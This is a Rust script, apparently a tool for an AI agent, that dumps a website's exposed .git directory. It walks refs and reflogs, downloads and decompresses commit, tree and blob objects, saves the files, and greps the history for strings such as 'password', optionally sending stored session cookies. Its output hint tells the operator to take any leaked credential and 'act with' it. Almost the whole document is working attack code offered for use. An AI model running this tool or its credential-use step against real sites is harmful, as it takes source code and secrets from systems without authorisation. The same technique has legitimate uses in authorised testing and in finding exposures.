#!/usr/bin/env rust-script
//! name: git_dump
//! description: Exposed .git dumper - walk a web-served .git from HEAD/refs/reflog, inflate every loose commit/tree/blob object recursively and report each file's path, size and content per commit, flagging --match hits; the version-control-history disclosure primitive (loose objects only; packed objects are reported as missing).
//! version: 1.0.0
//! args: <base-url> [--git .git] [--jar PATH] [--out DIR] [--match REGEX] [--max-objects N] [--snippet N] [--selftest]
//! keywords: information-disclosure, git, version-control, source-leak, loose-object, zlib, dump, history
//!
//! ```cargo
//! [dependencies]
//! ureq = { version = "2" }
//! flate2 = "1"
//! regex = "1"
//! ```

use pi_rust_lib::serde_json::{self, json, Value};
use std::collections::{BTreeMap, HashSet};
use std::io::Read;
use std::time::Duration;

type Jar = BTreeMap<String, BTreeMap<String, String>>;

struct Opts {
    base: String,
    git: String,
    jar_path: String,
    out: Option<String>,
    matcher: Option<regex::Regex>,
    max_objects: usize,
    snippet: usize,
    selftest: bool,
}

fn main() {
    let args: Vec<String> = std::env::args().skip(1).collect();
    let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".to_string());
    let mut opts = Opts {
        base: String::new(),
        git: ".git".into(),
        jar_path: format!("{home}/.pi-rs/agent/lab-jar.json"),
        out: None,
        matcher: None,
        max_objects: 400,
        snippet: 400,
        selftest: false,
    };
    let mut i = 0;
    while i < args.len() {
        match args[i].as_str() {
            "--git" => {
                i += 1;
                if i < args.len() {
                    opts.git = args[i].trim_matches('/').to_string();
                }
            }
            "--jar" => {
                i += 1;
                if i < args.len() {
                    opts.jar_path = args[i].clone();
                }
            }
            "--out" => {
                i += 1;
                if i < args.len() {
                    opts.out = Some(args[i].clone());
                }
            }
            "--match" => {
                i += 1;
                if i < args.len() {
                    opts.matcher = regex::Regex::new(&args[i]).ok();
                }
            }
            "--max-objects" => {
                i += 1;
                if i < args.len() {
                    opts.max_objects = args[i].parse().unwrap_or(400);
                }
            }
            "--snippet" => {
                i += 1;
                if i < args.len() {
                    opts.snippet = args[i].parse().unwrap_or(400);
                }
            }
            "--selftest" => opts.selftest = true,
            other if !other.starts_with("--") && opts.base.is_empty() => opts.base = other.trim_end_matches('/').to_string(),
            _ => {}
        }
        i += 1;
    }

    if opts.selftest {
        selftest();
        return;
    }
    if opts.base.is_empty() {
        pi_rust_lib::report::failure(
            "git_dump",
            "base url required",
            "call as: git_dump 'https://host' [--git .git] [--jar path] [--out dir] [--match 'password']",
        );
        std::process::exit(2);
    }

    let host = host_of(&opts.base);
    let jar = load_jar(&opts.jar_path);
    let cookie = cookie_header(&jar, &host);
    let agent = ureq::AgentBuilder::new()
        .timeout_connect(Duration::from_secs(15))
        .timeout(Duration::from_secs(30))
        .build();

    let mut dumper = Dumper {
        base: opts.base.clone(),
        git: opts.git.clone(),
        cookie,
        agent,
        objects: std::collections::HashMap::new(),
        fetched: 0,
        max_objects: opts.max_objects,
        missing: Vec::new(),
    };

    // 1. refs: HEAD -> branch -> ref file, plus packed-refs.
    let mut refs: Vec<Value> = Vec::new();
    let head_raw = dumper.fetch_text(&format!("/{}/HEAD", opts.git));
    let head_ref = head_raw
        .as_deref()
        .map(|s| s.trim())
        .and_then(|s| s.strip_prefix("ref:"))
        .map(|s| s.trim().to_string());
    let mut ref_names: Vec<String> = Vec::new();
    if let Some(r) = &head_ref {
        ref_names.push(r.clone());
    }
    if let Some(text) = dumper.fetch_text(&format!("/{}/packed-refs", opts.git)) {
        for line in text.lines() {
            let line = line.trim();
            if line.is_empty() || line.starts_with('#') || line.starts_with('^') {
                continue;
            }
            if let Some((sha, name)) = line.split_once(' ') {
                refs.push(json!({"name": name.trim(), "sha": sha.trim(), "source": "packed-refs"}));
                ref_names.push(name.trim().to_string());
            }
        }
    }
    for name in ref_names.iter() {
        if let Some(sha) = dumper.fetch_text(&format!("/{}/{}", opts.git, name)) {
            let sha = sha.trim().to_string();
            if sha.len() == 40 && !refs.iter().any(|r| r["name"] == json!(name)) {
                refs.push(json!({"name": name, "sha": sha, "source": "ref-file"}));
            }
        }
    }

    // 2. reflog gives every historical commit with its message.
    let mut commits: Vec<(String, Option<String>)> = Vec::new();
    let mut log_paths = vec![format!("/{}/logs/HEAD", opts.git)];
    for name in ref_names.iter() {
        log_paths.push(format!("/{}/logs/{}", opts.git, name));
    }
    for lp in log_paths {
        if let Some(text) = dumper.fetch_text(&lp) {
            for line in text.lines() {
                let mut it = line.split_whitespace();
                let _old = it.next();
                let new = it.next().unwrap_or("");
                if new.len() != 40 {
                    continue;
                }
                let msg = line.split('\t').nth(1).map(|s| s.to_string());
                if !commits.iter().any(|(s, _)| s == new) {
                    commits.push((new.to_string(), msg));
                }
            }
        } else if lp.ends_with("/HEAD") {
            // no reflog served: fall back to whatever the refs point at
        }
    }
    for r in refs.iter() {
        if let Some(sha) = r["sha"].as_str() {
            if !commits.iter().any(|(s, _)| s == sha) {
                commits.push((sha.to_string(), None));
            }
        }
    }
    if let Some(h) = &head_raw {
        let h = h.trim();
        if h.len() == 40 && !commits.iter().any(|(s, _)| s == h) {
            commits.push((h.to_string(), None));
        }
    }

    // 3. walk every commit's tree, caching objects.
    let mut commit_rows: Vec<Value> = Vec::new();
    let mut matches: Vec<Value> = Vec::new();
    let mut written: HashSet<String> = HashSet::new();
    let snippet = opts.snippet;
    for (sha, logmsg) in commits.iter() {
        let content = match dumper.object(sha, "commit") {
            Some(c) => c,
            None => {
                commit_rows.push(json!({"sha": sha, "error": "commit object not served (packed objects unsupported)"}));
                continue;
            }
        };
        let text = String::from_utf8_lossy(&content).to_string();
        let tree = text
            .lines()
            .find(|l| l.starts_with("tree "))
            .map(|l| l[5..].trim().to_string())
            .unwrap_or_default();
        let subject = text.lines().skip_while(|l| !l.is_empty()).nth(1).unwrap_or("").to_string();
        let mut files: Vec<(String, String)> = Vec::new();
        dumper.walk(&tree, "", 0, &mut files);
        let mut file_rows: Vec<Value> = Vec::new();
        for (path, blob_sha) in files.iter() {
            let raw = dumper.object(blob_sha, "blob").unwrap_or_default();
            let body = String::from_utf8_lossy(&raw).to_string();
            let mut row = json!({"path": path, "sha": blob_sha, "size": raw.len()});
            if body.len() <= snippet {
                row["content"] = json!(body);
            } else {
                row["snippet"] = json!(body.chars().take(snippet).collect::<String>());
            }
            if let Some(re) = &opts.matcher {
                for (n, line) in body.lines().enumerate() {
                    if re.is_match(line) {
                        matches.push(json!({
                            "commit": sha, "commit_message": logmsg,
                            "path": path, "line": n + 1, "text": line.trim(),
                        }));
                    }
                }
            }
            if let Some(dir) = &opts.out {
                let safe = path.replace("..", "_").trim_start_matches('/').to_string();
                let target = format!("{dir}/{}/{safe}", &sha[..8.min(sha.len())]);
                if written.insert(target.clone()) {
                    if let Some(parent) = std::path::Path::new(&target).parent() {
                        let _ = std::fs::create_dir_all(parent);
                    }
                    let _ = std::fs::write(&target, &raw);
                }
            }
            file_rows.push(row);
        }
        commit_rows.push(json!({
            "sha": sha,
            "reflog_message": logmsg,
            "subject": subject,
            "files": file_rows,
        }));
    }

    let data = json!({
        "base": opts.base,
        "git_dir": opts.git,
        "head": head_raw.as_deref().map(|s| s.trim().to_string()),
        "head_ref": head_ref,
        "refs": refs,
        "commit_count": commits.len(),
        "commits": commit_rows,
        "match_count": matches.len(),
        "matches": matches,
        "missing_objects": dumper.missing,
        "objects_fetched": dumper.fetched,
        "out": opts.out,
    });
    pi_rust_lib::report::success(
        "git_dump",
        data,
        "read matches first (a password/secret in an older commit is the disclosure); then act with that credential",
    )
    .expect("report success");
}

struct Dumper {
    base: String,
    git: String,
    cookie: Option<String>,
    agent: ureq::Agent,
    objects: std::collections::HashMap<String, Vec<u8>>,
    fetched: usize,
    max_objects: usize,
    missing: Vec<String>,
}

impl Dumper {
    fn fetch(&mut self, path: &str) -> Option<Vec<u8>> {
        let url = format!("{}{}", self.base, path);
        let mut req = self.agent.get(&url);
        if let Some(c) = &self.cookie {
            req = req.set("Cookie", c);
        }
        req = req.set("User-Agent", "Mozilla/5.0 (git_dump)");
        match req.call() {
            Ok(resp) => {
                let mut buf = Vec::new();
                if resp.into_reader().read_to_end(&mut buf).is_ok() {
                    Some(buf)
                } else {
                    None
                }
            }
            Err(_) => None,
        }
    }

    fn fetch_text(&mut self, path: &str) -> Option<String> {
        self.fetch(path).map(|b| String::from_utf8_lossy(&b).to_string())
    }

    /// Fetch a loose object by sha and inflate it; returns the object content.
    fn object(&mut self, sha: &str, want: &str) -> Option<Vec<u8>> {
        if let Some(hit) = self.objects.get(sha) {
            return Some(hit.clone());
        }
        if self.fetched >= self.max_objects {
            return None;
        }
        self.fetched += 1;
        let path = format!("/{}/objects/{}/{}", self.git, &sha[..2], &sha[2..]);
        let raw = self.fetch(&path)?;
        let content = inflate(&raw)?;
        let (_ty, body) = split_object(&content)?;
        if want == "commit" || want == "tree" {
            let ty = String::from_utf8_lossy(&content[..content.iter().position(|b| *b == b' ').unwrap_or(0)]).to_string();
            if ty != want {
                self.missing.push(format!("{sha}: expected {want}, got {ty}"));
            }
        }
        self.objects.insert(sha.to_string(), body.clone());
        Some(body)
    }

    fn walk(&mut self, tree_sha: &str, prefix: &str, depth: usize, out: &mut Vec<(String, String)>) {
        if depth > 24 || tree_sha.is_empty() || out.len() > 2000 {
            return;
        }
        let content = match self.object(tree_sha, "tree") {
            Some(c) => c,
            None => {
                self.missing.push(format!("tree {tree_sha} not served"));
                return;
            }
        };
        for (mode, name, sha) in parse_tree(&content) {
            let path = if prefix.is_empty() { name.clone() } else { format!("{prefix}/{name}") };
            if mode == "40000" || mode == "040000" {
                self.walk(&sha, &path, depth + 1, out);
            } else {
                out.push((path, sha));
            }
        }
    }
}

fn inflate(raw: &[u8]) -> Option<Vec<u8>> {
    let mut dec = flate2::read::ZlibDecoder::new(raw);
    let mut out = Vec::new();
    dec.read_to_end(&mut out).ok()?;
    Some(out)
}

/// Loose object = "<type> <size>\0<content>"
fn split_object(inflated: &[u8]) -> Option<(String, Vec<u8>)> {
    let nul = inflated.iter().position(|b| *b == 0)?;
    let header = String::from_utf8_lossy(&inflated[..nul]).to_string();
    let ty = header.split(' ').next()?.to_string();
    Some((ty, inflated[nul + 1..].to_vec()))
}

fn parse_tree(content: &[u8]) -> Vec<(String, String, String)> {
    let mut out = Vec::new();
    let mut i = 0usize;
    while i < content.len() {
        let sp = match content[i..].iter().position(|b| *b == b' ') {
            Some(p) => i + p,
            None => break,
        };
        let mode = String::from_utf8_lossy(&content[i..sp]).to_string();
        let nul = match content[sp + 1..].iter().position(|b| *b == 0) {
            Some(p) => sp + 1 + p,
            None => break,
        };
        let name = String::from_utf8_lossy(&content[sp + 1..nul]).to_string();
        let sha_start = nul + 1;
        if sha_start + 20 > content.len() {
            break;
        }
        let sha: String = content[sha_start..sha_start + 20].iter().map(|b| format!("{b:02x}")).collect();
        out.push((mode, name, sha));
        i = sha_start + 20;
    }
    out
}

fn selftest() {
    // synthetic loose commit + tree round-trip through the real inflate/parse path
    let blob = b"ADMIN_PASSWORD=hunter2\n".to_vec();
    let blob_sha = "aa".to_string() + &"b".repeat(38);
    let mut tree_body = Vec::new();
    tree_body.extend_from_slice(b"100644 admin.conf\0");
    tree_body.extend_from_slice(&hex20(&blob_sha));
    let mut tree = format!("tree {}\0", tree_body.len()).into_bytes();
    tree.extend_from_slice(&tree_body);
    let tree_sha = "cc".to_string() + &"d".repeat(38);
    let commit = format!(
        "commit {}\0tree {tree_sha}\nauthor Carlos <c@x> 1 +0000\ncommitter Carlos <c@x> 1 +0000\n\nAdd skeleton admin panel\n",
        "0".repeat(0)
    );
    let commit_bytes = format!(
        "commit 100\0tree {tree_sha}\n\nAdd skeleton admin panel\n"
    )
    .into_bytes();

    let mut enc = flate2::write::ZlibEncoder::new(Vec::new(), flate2::Compression::default());
    std::io::Write::write_all(&mut enc, &tree).expect("zlib write");
    let tree_z = enc.finish().expect("zlib finish");
    let back = inflate(&tree_z).expect("inflate tree");
    let (ty, body) = split_object(&back).expect("split tree");
    let entries = parse_tree(&body);
    let ok_tree = ty == "tree" && entries.len() == 1 && entries[0].1 == "admin.conf" && entries[0].2 == blob_sha;

    let mut enc2 = flate2::write::ZlibEncoder::new(Vec::new(), flate2::Compression::default());
    std::io::Write::write_all(&mut enc2, &commit_bytes).expect("zlib write");
    let cz = enc2.finish().expect("zlib finish");
    let (ty2, body2) = split_object(&inflate(&cz).expect("inflate commit")).expect("split commit");
    let subj = String::from_utf8_lossy(&body2)
        .lines()
        .skip_while(|l| !l.is_empty())
        .nth(1)
        .unwrap_or("")
        .to_string();
    let _ = (blob, commit);
    let ok_commit = ty2 == "commit" && subj == "Add skeleton admin panel";

    if ok_tree && ok_commit {
        pi_rust_lib::report::success(
            "git_dump",
            json!({"selftest": "ok", "tree_parse": ok_tree, "commit_parse": ok_commit, "synthetic_tree_sha": tree_sha}),
            "run against a live exposed .git: git_dump <base-url> --match 'password'",
        )
        .expect("report success");
    } else {
        pi_rust_lib::report::failure(
            "git_dump",
            format!("selftest assertions failed (tree_parse={ok_tree}, commit_parse={ok_commit})").as_str(),
            "check parse_tree/split_object against the synthetic object",
        );
        std::process::exit(2);
    }
}

fn hex20(sha: &str) -> [u8; 20] {
    let mut out = [0u8; 20];
    let b = sha.as_bytes();
    for i in 0..20 {
        let hi = (b[i * 2] as char).to_digit(16).unwrap_or(0) as u8;
        let lo = (b[i * 2 + 1] as char).to_digit(16).unwrap_or(0) as u8;
        out[i] = hi * 16 + lo;
    }
    out
}

fn host_of(base: &str) -> String {
    let rest = base.split("://").nth(1).unwrap_or(base);
    let host = rest.split('/').next().unwrap_or(rest);
    host.split(':').next().unwrap_or(host).to_string()
}

fn load_jar(path: &str) -> Jar {
    match std::fs::read_to_string(path) {
        Ok(text) => serde_json::from_str(&text).unwrap_or_default(),
        Err(_) => Jar::new(),
    }
}

fn cookie_header(jar: &Jar, host: &str) -> Option<String> {
    let map = jar.get(host)?;
    if map.is_empty() {
        return None;
    }
    Some(map.iter().map(|(k, v)| format!("{k}={v}")).collect::<Vec<_>>().join("; "))
}
